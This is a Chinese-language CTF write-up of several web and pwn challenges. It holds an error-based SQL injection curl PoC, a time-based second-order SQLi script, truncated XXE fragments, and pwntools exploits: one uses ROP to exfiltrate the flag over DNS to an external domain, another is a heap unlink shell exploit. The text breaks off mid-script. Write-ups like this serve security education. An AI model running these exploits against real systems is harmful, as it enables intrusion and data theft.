## Web
### SimpleBBS
Error-based 注入，通过错误信息获得flag。
PoC如下：
    curl -X POST \
      http://bbs.sec.zju.edu.cn/index.php/login/valid \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -H 'Postman-Token: 9a5f4151-4ff2-4366-bde2-94d3f0ff72a7' \
      -H 'cache-control: no-cache' \
      -d 'username=qweqwe'\''%20OR%20(SELECT%205979%20FROM(SELECT%20COUNT(*)%2CCONCAT(0x7176626271%2C(SELECT%20%0A%20flag%20from%20flag)%2C0x716b716b71%2CFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)--%20fsUE&password=qweqwe&undefined='
EIS{7879f0a27d8bcfcff0bcc837d7641e81}
### SimpleWasmReverse
strings 命令获得 flag.wasm 中的两个关键字符串 `ABCDEFG.....` 和
`aW9kan40NGgzOTNkNWZoNDtlOjloNmk1OThmNzk4O2dkPDRoZoA=`，猜测是base64码表与编码后的flag，解码后长度为38，与WASM逆向后对字符串长度判断相符。
对wasm分析，其中`_check`函数中对输入字符存在逐个加3的操作，猜测为此方法处理flag，对获得的base64解码，逐位减3获得flag。
    >>> for c in 'aW9kan40NGgzOTNkNWZoNDtlOjloNmk1OThmNzk4O2dkPDRoZoA='.decode('base64'):
    ...     print chr(ord(c)-3),
    ...
    f l a g { 1 1 e 0 6 0 a 2 c e 1 8 b 7 6 e 3 f 2 6 5 c 4 6 5 8 d a 9 1 e c }
### SimpleExtensionExplorerInjection
阅读源码发现`UserController.java`中解析参数时，使用了 `@XBRead`，则可解析XML并回显。
构造 XXE payload 获得flag。
      ]>
    &xxe;
### SimplePrintEventLogger
与 `SimpleExtensionExplorerInjection` 中相同，使用XXE poc: `file:///`
列出根目录，获取第二个flag的文件名，并读取。
      ]>
    &xxe;
EIS{f501e9c5323c560b0a40192ce9b7ad38}
### SimpleServerInjection
出题人提示了SSI
### Simple Blog
二次注入
    import requests
    import time
    import string
    def sqli(payload):
        start_time = time.time()
        session = requests.Session()
        register_url = "http://210.32.4.20/register.php"
        data = {
            'username': payload,
            'password': "123"
        }
        session.post(register_url, data=data, allow_redirects=False)
        login_url = "http://210.32.4.20/login.php"
        session.post(login_url, data=data, allow_redirects=False)
        answer_url = "http://210.32.4.20/answer.php"
        data = {
            "1.b": "on"
        }
        http_content = session.post(answer_url, data=data, allow_redirects=False).content
        # print http_content[http_content.find('alert'):http_content.find('alert')+100]
        run_time = time.time() - start_time
        return run_time
    sqli_payload = "dubhexxxdubhe5' or if(ord(substr((select flag from flag), %d, 1))=%d, sleep(0.005), 0) -- n"
    flag = 'EIS{397ea47dcc07dd2abdffc5b16c9026f5}'
    for i in range(50):
        for char in string.printable:
            payload = sqli_payload % (len(flag) + 1, ord(char))
            t = sqli(payload)
            print char, t
            if t > 1:
                flag += char
                print flag
                break
## PWN
### dns of melody
这题可以利用dns递归查询，来将flag传输到权威服务器上面（感谢Dlive师傅给的域名）
    from pwn import *
    import time
    context(arch = 'amd64', os = 'linux', endian = 'little')
    context.log_level = 'debug'
    context.terminal = ['tmux', 'split', '-h']
    def call(r12, rdi, rsi ,rdx):
        shellcode = p64(0x4012AA) + p64(0) + p64(1) + p64(r12) + p64(rdx) + p64(rsi) + p64(rdi)
        shellcode += p64(0x401290) + p64(0) * 7
        return shellcode
    def add(p, l, hostname):
        p.recvuntil('Select:\n')
        p.sendline('1')
        p.recvuntil('length: \n')
        p.sendline(str(l))
        p.sendline(hostname)
    def do(p, index):
        p.recvuntil('Select:\n')
        p.sendline('2')
        p.recvuntil('index: \n')
        p.sendline(str(index))
    def delete(p, index):
        p.recvuntil('Select:\n')
        p.sendline('3')
        p.recvuntil('index: \n')
        p.sendline(str(index))
    def edit(p, index, data):
        p.recvuntil('Select:\n')
        p.sendline('4')
        p.recvuntil('index: \n')
        p.sendline(str(index))
        p.sendline(data)
    def getflag(ip, port, debug, index):
        if debug == 1:
            p = process('./dns_of_melody')
            gdb.attach(p, 'b *0x401246\nc')
        else:
            p = remote(ip, port)
        add(p, 100, 'aaaaaaaaaaaaaaa')
        add(p, 100, 'a.zptvs7.ceye.io')
        add(p, 100, './flag')
        do(p, 0)
        p.recvuntil('Unknown host!')
        edit(p, 0, '\x00' * 0x1A0 + p64(0) + call(0x0601FE8, 0x602368, 0, 0) + call(0x601FB8, 0, 0x6021e4 - index, index + 1) + call(0x601FD0, 0x6021e4 - index, 0, 0))
        # p.interactive()
    def GameStart(ip, port, debug):
        flag_len = 25
        getflag(ip, port, debug, flag_len - 1)
        # for i in range(flag_len):
        #   getflag(ip, port, debug, i)
        #   time.sleep(0.5)
    if __name__ == '__main__':
        GameStart('210.32.4.15', 13374, 0)
### hack
思路和pwnable.kr的unlink一致，通过修改栈上的值劫持栈帧（main函数ret前的逻辑）到堆上（堆地址已知）。利用两次泄漏可以获得libc的基地址和栈地址。
exp
    # coding=utf-8
    from pwn import *
    def pwn():
        BIN_PATH = './hack'
        DEBUG = 0
        context.arch = 'i386'
        if DEBUG == 1:
            p = process(BIN_PATH)
            elf = ELF(BIN_PATH)
            context.log_level = 'debug'
            context.terminal = ['tmux', 'split', '-h']
            if context.arch == 'amd64':
                libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            else:
                libc = ELF('/lib/i386-linux-gnu/libc.so.6')
        else:
            p = remote('210.32.4.16', 13375)
            elf = ELF(BIN_PATH)
            libc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so')
            context.log_level = 'debug'
        p.recvuntil('input address: ')
        p.sendline(str(elf.got['puts']))
        p.recvuntil(str(elf.got['puts']) + ', ')
        recv = p.recvuntil('\n')
        libc.address = int(recv, 16) - libc.symbols['puts']
        print hex(libc.address)
        #gdb.attach(p, gdbscript='b *0x80486ff')
        p.recvuntil('Second chance: \n')
        p.sendline(str(libc.symbols['__environ']))
        p.recvuntil(', ')
        recv = p.recvuntil('\n')
        stack_address = int(recv, 16)
        print hex(stack_address)
        raw_input()
        p.recvuntil('The address of the node is ')
        recv = p.recvuntil(', ', drop=True)
        heap_addr = int(recv, 16)
        ecx_address = stack_address - (0xfff84ddc - 0xfff84d3c)
        target_address = stack_address - (0xffb3d93c - 0xffb3d884)
        print hex(ecx_address)
        if DEBUG == 1:
            one_gadget = [0x3ac5c, 0x3ac5e, 0x3ac62, 0x3ac69, 0x5fbc5, 0x5fbc6]
        else:
            one_gadget = [0x3a80c, 0x3a80e, 0x3a812, 0x3a819]
        #payload = p32(heap_addr) + p32(heap_addr) + p32(heap_addr - 0xc) + p32(stack_address - 0x8)
        payload = p32(libc.address + one_gadget[3]) + p32(heap_addr + 12) + p32(heap_addr + 0x4) + p32(target_address - 0x8)
        p.recvuntil('fake node now: ')
        p.send(payload)
        p.interactive()
        p.close()
    if __name__ == '__main__':
        pwn()
flag:EIS{d2954e2d38bf6b2ed3ebfead7bb6cd33}
### justnote
堆溢出，在插入的时候，输入最小的负值可以造成堆溢出
    from pwn import *
    context(arch = 'amd64', os = 'linux', endian = 'little')
    context.log_level = 'debug'
    context.terminal = ['tmux', 'split', '-h']
    def add(p, lgth, note):
        p.recvuntil('choice: ')
        p.sendline('1')
        p.recvuntil('note: ')
        p.sendline(str(lgth))
        p.recvuntil('note: ')
        p.sendline(note)
    def delete(p, idx):
        p.recvuntil('choice: ')
        p.sendline('2')
        p.recvuntil('note: ')